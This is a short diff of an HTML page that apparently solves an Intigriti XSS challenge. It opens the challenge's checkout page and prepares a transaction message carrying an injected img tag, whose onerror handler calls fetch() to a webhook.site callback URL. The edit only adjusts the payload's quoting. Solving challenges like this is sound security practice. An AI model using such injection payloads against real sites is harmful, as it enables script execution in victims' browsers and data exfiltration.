@@ -2,7 +2,7 @@
 <body>
     <script>
         const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00000001", "_blank");
-        const xssPayload = '\"\u003E\u003Cimg src=x onerror=\"fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\"\u003E';
+        const xssPayload = '\"\u003E\u003Cimg src=x onerror=fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\u003E';
         const payload = {
             type: "submitTransaction",
             transaction: {
